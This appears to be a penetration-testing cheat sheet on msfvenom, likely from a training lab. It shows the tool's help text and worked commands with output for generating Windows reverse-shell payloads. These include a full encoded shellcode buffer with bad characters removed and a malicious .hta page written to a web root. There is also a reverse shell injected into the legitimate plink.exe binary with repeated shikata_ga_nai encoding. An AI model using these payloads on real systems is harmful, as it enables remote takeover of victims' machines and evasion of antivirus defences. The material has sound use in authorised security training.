---
Description: MSFvenom replaced both msfpayload and msfencode as of June 8th, 2015. In order to correctly manage shells obtained by msfvenom is foundamental to use msfconsole
---

>[!info]
>MSFvenom replaced both msfpayload and msfencode as of June 8th, 2015. 

In order to correctly manage shells obtained by msfvenom is foundamental to use [Metasploit Exploit Multi Handler](msfconsole.md#Metasploit%20Exploit%20Multi%20Handler)

```bash
┌──(kali㉿kali)-[~/Documents/lab/binExpl]
└─$ msfvenom -h
MsfVenom - a Metasploit standalone payload generator.
Also a replacement for msfpayload and msfencode.
Usage: /usr/bin/msfvenom [options] <var=val>
Example: /usr/bin/msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> -f exe -o payload.exe

Options:
    -l, --list            <type>     List all modules for [type]. Types are: payloads, encoders, nops, platforms, archs, encrypt, formats, all
    -p, --payload         <payload>  Payload to use (--list payloads to list, --list-options for arguments). Specify '-' or STDIN for custom
        --list-options               List --payload <value>\'s standard, advanced and evasion options
    -f, --format          <format>   Output format (use --list formats to list)
    -e, --encoder         <encoder>  The encoder to use (use --list encoders to list)
        --service-name    <value>    The service name to use when generating a service binary
        --sec-name        <value>    The new section name to use when generating large Windows binaries. Default: random 4-character alpha string
        --smallest                   Generate the smallest possible payload using all available encoders
        --encrypt         <value>    The type of encryption or encoding to apply to the shellcode (use --list encrypt to list)
        --encrypt-key     <value>    A key to be used for --encrypt
        --encrypt-iv      <value>    An initialization vector for --encrypt
    -a, --arch            <arch>     The architecture to use for --payload and --encoders (use --list archs to list)
        --platform        <platform> The platform for --payload (use --list platforms to list)
    -o, --out             <path>     Save the payload to a file
    -b, --bad-chars       <list>     Characters to avoid example: '\x00\xff'
    -n, --nopsled         <length>   Prepend a nopsled of [length] size on to the payload
        --pad-nops                   Use nopsled size specified by -n <length> as the total payload size, auto-prepending a nopsled of quantity (nops minus payload length)
    -s, --space           <length>   The maximum size of the resulting payload
        --encoder-space   <length>   The maximum size of the encoded payload (defaults to the -s value)
    -i, --iterations      <count>    The number of times to encode the payload
    -c, --add-code        <path>     Specify an additional win32 shellcode file to include
    -x, --template        <path>     Specify a custom executable file to use as a template
    -k, --keep                       Preserve the --template behaviour and inject the payload as a new thread
    -v, --var-name        <value>    Specify a custom variable name to use for certain output formats
    -t, --timeout         <second>   The number of seconds to wait when reading the payload from STDIN (default 30, 0 to disable)
    -h, --help                       Show this message
```

### Generating custom shellcode without bad-chars

Warning: when generating custom exploit, default `EXITFUNC` is `ExitProcess`. In order to keep alive the application once the exploitation is over, change the `EXITFUNC` to `thread`

```bash
root@kali:~$ msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -f py –e x86/shikata_ga_nai -b "\x00\x0a\x0d" EXITFUNC=thread -v buf
Found 1 compatible encoders
Attempting to encode payload with 3 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 368 (iteration=0)
x86/shikata_ga_nai succeeded with size 395 (iteration=1)
x86/shikata_ga_nai succeeded with size 422 (iteration=2)
x86/shikata_ga_nai chosen with final size 422
Payload size: 422 bytes
Final size of python file: 2062 bytes
buf =  b""
buf += b"\xbe\xb8\xea\x79\xf1\xda\xc3\xd9\x74\x24\xf4\x58\x29"
buf += b"\xc9\xb1\x63\x31\x70\x15\x03\x70\x15\x83\xe8\xfc\xe2"
buf += b"\x4d\x33\xbf\x4e\x5a\x5c\x8a\x0e\x7d\x29\x2f\x85\x25"
buf += b"\xe3\xe6\xd4\x88\x32\x81\x01\xb1\xf5\x75\x2d\x3a\x7e"
buf += b"\x5d\x7b\x95\x87\xb1\xbc\x26\x04\x20\xb3\x77\x02\x41"
buf += b"\x6c\x0b\xb5\x06\x86\xd0\xa7\xcf\xa9\x1f\x59\xd4\x8e"
buf += b"\x37\x48\x98\x44\xa4\x82\x1b\xc9\x88\xfd\x01\xb1\xf8"
buf += b"\x15\xbe\x6f\xb6\x37\x2e\x80\x2e\x24\x11\x85\x0f\x2e"
buf += b"\x8e\x1c\x08\x46\x88\x84\x0e\x8c\x33\x1e\x1b\xca\x4f"
buf += b"\x76\x70\x75\x4a\x2e\x7e\x34\x7b\x11\x94\x6f\xd5\xe4"
buf += b"\xdb\xfd\x7b\x5d\x31\x98\x30\x40\xe0\xd9\xa1\x0b\xbd"
buf += b"\xf1\xfd\x5d\x71\x88\x16\x2f\xeb\x64\x16\x45\xf7\x1c"
buf += b"\x8e\xbb\x68\x21\x5d\x1d\x59\x58\x5e\x7a\x6c\x7f\x8e"
buf += b"\xcb\xee\x47\x40\x06\xa0\x75\xbb\x1f\xfc\x4a\x33\xd6"
buf += b"\x4f\xa2\x69\x10\x87\x11\x18\xe4\x1e\x47\x10\x67\x26"
buf += b"\x38\x03\x4f\x9c\x60\x80\x04\x25\x6c\xcc\x05\xb9\x1a"
buf += b"\xc7\x99\x19\xe4\x69\x81\x57\x8c\x47\x06\x4b\x8d\x1c"
buf += b"\xeb\x11\xb9\x4f\x9b\x77\x1b\x17\x90\xbd\xe7\x03\x28"
buf += b"\xf2\xd8\x32\x04\x36\x5b\x6e\x29\x03\x14\x4f\x08\x7f"
buf += b"\x09\xf5\x4f\x83\x90\x24\xfb\x3d\xcb\x29\x96\xb9\x22"
buf += b"\x4a\x2d\x81\xb6\xeb\xbc\xf8\x6f\xa1\x88\xea\x3f\x69"
buf += b"\xcf\x71\x98\x64\xdc\xa8\x84\x58\xd8\xde\x7b\x64\xfe"
buf += b"\xfb\xd3\x27\x9c\xcc\x98\xa7\x78\x10\x12\xca\xa9\x8f"
buf += b"\x0b\x95\x24\xee\x44\xa3\xb5\xf9\x38\xd5\x6b\x64\x26"
buf += b"\xcf\xc7\xd0\xec\x67\x3e\x8f\x16\xe6\xd0\xa4\x14\x87"
buf += b"\x74\x69\xe2\xf1\xde\x4a\x86\x41\xd6\xf7\xa8\x42\x81"
buf += b"\xf8\x7c\x24\xfc\xbe\x6e\x5b\x85\x9c\x8b\x56\x67\x96"
buf += b"\xcf\x0e\x15\x32\xcd\x82\xa1\xcf\xe2\xf6\x9f\x4b\x41"
buf += b"\x2d\x23\x7c\x71\xb8\xe3\x24\xaa\x41\x8e\x31\xe3\x19"
buf += b"\xe1\x99\xbf\x11\xa7\x4a\x85\x57\x05\x27\xaa\xc5\x69"
buf += b"\xc8\x91\xc0\xdf\x4e\x10\x89\x62\xc0\x8b\x3e\xdb\x9b"
buf += b"\xe1\xf6\x87\x22\xec\x36\x08\x10\x05\xc7\x32\x32\x76"
buf += b"\xd0\x86\xfe\x7e\x51\xa1"
```

>[!warning]
>Warning: Because of the encoding, the shellcode is not directly executable and is therefore prepended by a decoder stub. The job of this stub is to iterate over the encoded shellcode bytes and decode them back to their original executable form. In order to perform this task, the decoder needs to gather its address in memory and from there, look a few bytes ahead to locate the encoded shellcode that it needs to decode.
>As part of the process of gathering the decoder stub’s location in memory, the code performs a sequence of assembly instructions, which are commonly referred to as a GetPC routine. This is essentially a short routine that moves the value of the EIP register (sometimes referred to as the Program Counter or PC) into another register.

As with other GetPC routines, those used by **shikata_ga_nai** have an unfortunate side-effect of writing some data at and around the top of the stack. This eventually mangles at least a couple of bytes close to the address pointed at by the ESP register. Unfortunately, this small change on the stack is a problem for us because the decoder starts exactly at the address pointed to by the ESP register. In short, the GetPC routine execution ends up changing a few bytes of the decoder itself (and potentially the encoded shellcode), which eventually fails the decoding process and crashes the target process.
The solution to this problem is to place a NOP Sled right before the payload, so even if the GetPC change some previous bytes, it is sure that the changed bytes are not vital to the correct execution of the program.

### Generating malicious .hta pages

```bash
kali@kali:~$ sudo msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=4444 -f hta-psh -o /var/www/html/evil.hta
No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No Arch selected, selecting Arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 324 bytes
Final size of hta-psh file: 6461 bytes
Saved as: /var/www/html/evil.hta
```

### Injecting malicious encrypted payload within an existing binary

```bash
kali@kali:~$ msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-resources/binaries/plink.exe -o shell_reverse_msf_encoded_embedded.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 9 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai succeeded with size 378 (iteration=1)
x86/shikata_ga_nai succeeded with size 405 (iteration=2)
x86/shikata_ga_nai succeeded with size 432 (iteration=3)
x86/shikata_ga_nai succeeded with size 459 (iteration=4)
x86/shikata_ga_nai succeeded with size 486 (iteration=5)
x86/shikata_ga_nai succeeded with size 513 (iteration=6)
x86/shikata_ga_nai succeeded with size 540 (iteration=7)
x86/shikata_ga_nai succeeded with size 567 (iteration=8)
x86/shikata_ga_nai chosen with final size 567
Payload size: 567 bytes
Final size of exe file: 311296 bytes
Saved as: shell_reverse_msf_encoded_embedded.exe
```